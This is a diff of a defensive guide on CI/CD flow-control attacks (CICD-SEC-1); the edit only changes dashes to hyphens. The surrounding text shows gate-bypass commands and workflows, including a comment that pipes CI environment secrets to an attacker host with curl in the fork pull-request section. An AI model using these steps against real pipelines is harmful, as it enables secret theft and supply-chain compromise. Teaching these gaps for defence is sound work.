@@ -8,11 +8,11 @@
 
 ## Understanding Flow-Control Attack Vectors
 
-> **⚠ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and close these gaps in pipelines you own or are authorised to test.
+> **⚠ EDUCATIONAL PURPOSE ONLY** - the techniques below are shown so you can find and close these gaps in pipelines you own or are authorised to test.
 
-An attacker exploiting CICD-SEC-1 does not need a memory-corruption bug or a clever payload. They need **one foothold**—a developer account, a leaked token, an accepted pull request, or the ability to open a pull request—and a flow with no gate that would stop that foothold from reaching production. The exploitation is procedural: follow the path a legitimate change would follow, and observe that nothing along it demands a second, independent decision.
+An attacker exploiting CICD-SEC-1 does not need a memory-corruption bug or a clever payload. They need **one foothold**-a developer account, a leaked token, an accepted pull request, or the ability to open a pull request-and a flow with no gate that would stop that foothold from reaching production. The exploitation is procedural: follow the path a legitimate change would follow, and observe that nothing along it demands a second, independent decision.
 
-The attacker's objective in this category is almost always the same: **get attacker-chosen code, configuration, or artifacts into a trusted output** (the mainline branch, a release, a container image, or a live environment) while passing through the fewest possible checks—ideally zero.
+The attacker's objective in this category is almost always the same: **get attacker-chosen code, configuration, or artifacts into a trusted output** (the mainline branch, a release, a container image, or a live environment) while passing through the fewest possible checks-ideally zero.
 
 ### Core Attack Flow
 
@@ -59,7 +59,7 @@ gh pr review --approve         # the author approves their own PR
 gh pr merge --merge            # requirement satisfied by the author alone
 ```
 
-**Payoff**: the appearance of review with none of the substance—one actor supplies both the change and the only approval.
+**Payoff**: the appearance of review with none of the substance-one actor supplies both the change and the only approval.
 
 ### 3. Merging With Failing or Absent Status Checks
 
@@ -74,7 +74,7 @@ Checks exist in the pipeline but are not marked *required*, so the merge proceed
 gh pr merge --merge     # ships despite every check being red
 ```
 
-**Payoff**: security and quality gates that never actually block anything—the attacker ignores them.
+**Payoff**: security and quality gates that never actually block anything-the attacker ignores them.
 
 ### 4. Abusing Auto-Merge
 
@@ -105,7 +105,7 @@ jobs:
       - run: ./deploy.sh production      # no environment gate, no 2nd approver
 ```
 
-**Payoff**: reaching `main` and reaching production are the same event—merge (however achieved) equals release.
+**Payoff**: reaching `main` and reaching production are the same event-merge (however achieved) equals release.
 
 ### 6. Poisoned Pipeline Execution via Fork Pull Requests
 
@@ -125,11 +125,11 @@ jobs:
         #   env | curl -X POST --data-binary @- https://evil.example/collect
 ```
 
-**Payoff**: no merge, no review, not even an account—opening a pull request is enough to run code in a trusted context and steal CI secrets or deploy tokens.
+**Payoff**: no merge, no review, not even an account-opening a pull request is enough to run code in a trusted context and steal CI secrets or deploy tokens.
 
 ### 7. Tampering With the Pipeline Definition Itself
 
-Because the gates are code, the attacker edits the workflow to remove them—in the same change that carries the payload.
+Because the gates are code, the attacker edits the workflow to remove them-in the same change that carries the payload.
 
 ```diff
 --- a/.github/workflows/ci.yml
@@ -141,7 +141,7 @@ Because the gates are code, the attacker edits the workflow to remove them—in 
 +    if: false                 # disable the job entirely
 ```
 
-**Payoff**: if workflow files are not separately owned and reviewed, the attacker deletes the very checks that would have caught them—the flow polices itself out of existence.
+**Payoff**: if workflow files are not separately owned and reviewed, the attacker deletes the very checks that would have caught them-the flow polices itself out of existence.
 
 ### 8. Pushing With a Broad Token or Bot Identity
 
@@ -188,7 +188,7 @@ jobs:
           docker push registry.example.com/app:prod     # no provenance check, no approval
 ```
 
-**Payoff**: the attacker substitutes a tampered artifact at the promotion step, downstream of—and unprotected by—any source-side review.
+**Payoff**: the attacker substitutes a tampered artifact at the promotion step, downstream of-and unprotected by-any source-side review.
 
 ### 11. Bypassing Environment Approval With a Second Workflow
 
@@ -207,7 +207,7 @@ jobs:
           PROD_TOKEN: ${{ secrets.PROD_DEPLOY_TOKEN }}   # same power, no gate
 ```
 
-**Payoff**: the gate protects one door while an equivalent door stands open—flow control that is not applied uniformly is not applied at all.
+**Payoff**: the gate protects one door while an equivalent door stands open-flow control that is not applied uniformly is not applied at all.
 
 ### 12. Merge-Then-Revert Timing (Beating a Slow Review)
 
@@ -247,11 +247,11 @@ Self-approve a small PR that edits .github/workflows/*
 
 ## Key Takeaways
 
-1. **Exploitation is procedural, not technical**—the attacker walks the normal delivery path and finds no gate that stops one actor.
-2. **Automation identities are the soft underbelly**—tokens and bots often sit outside the very rules that constrain humans.
-3. **Fork pull requests can be code execution**—running untrusted PR code in a privileged context needs no merge and no account.
-4. **The gates are code, so they can be deleted**—an uncontrolled flow is routinely used to remove flow control.
-5. **A gate that is not uniform is not a gate**—one unprotected workflow, branch, or token undoes every protected one.
+1. **Exploitation is procedural, not technical**-the attacker walks the normal delivery path and finds no gate that stops one actor.
+2. **Automation identities are the soft underbelly**-tokens and bots often sit outside the very rules that constrain humans.
+3. **Fork pull requests can be code execution**-running untrusted PR code in a privileged context needs no merge and no account.
+4. **The gates are code, so they can be deleted**-an uncontrolled flow is routinely used to remove flow control.
+5. **A gate that is not uniform is not a gate**-one unprotected workflow, branch, or token undoes every protected one.
 
 ## Next Steps
 
